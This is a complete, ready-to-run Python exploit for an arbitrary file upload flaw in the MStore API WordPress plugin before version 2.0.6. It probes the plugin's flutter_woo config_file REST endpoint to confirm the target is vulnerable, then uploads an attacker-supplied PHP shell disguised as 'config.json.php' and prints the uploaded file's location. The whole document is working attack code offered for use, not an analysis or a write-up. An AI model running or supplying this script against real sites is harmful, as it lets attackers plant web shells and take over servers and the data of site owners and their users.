import os.path
from os import path
import json
import requests;
import sys

def print_banner():
	print("MStore API < 2.0.6 - Arbitrary File Upload")
	print("Author -> space_hen (www.github.com/spacehen)")
	
def print_usage():
	print("Usage: python3 exploit.py [target url] [shell path]")
	print("Ex: python3 exploit.py https://example.com ./shell.php")

def vuln_check(uri):
	response = requests.post(uri)
	raw = response.text

	if ("Key must be" in raw):
		return True;
	else:
		return False;

def main():

	print_banner()
	if(len(sys.argv) != 3):
		print_usage();
		sys.exit(1);

	base = sys.argv[1]
	file_path = sys.argv[2]

	rest_url = '/wp-json/api/flutter_woo/config_file'

	uri = base + rest_url;
	check = vuln_check(uri);

	if(check == False):
		print("(*) Target not vulnerable!");
		sys.exit(1)

	if( path.isfile(file_path) == False):
		print("(*) Invalid file!")
		sys.exit(1)

	files = {'file' : ( "config.json.php", open(file_path), "application/json" )}

	print("Uploading shell...");
	response = requests.post(uri, files=files )
	# response should be location of file
	print(response.text)

main();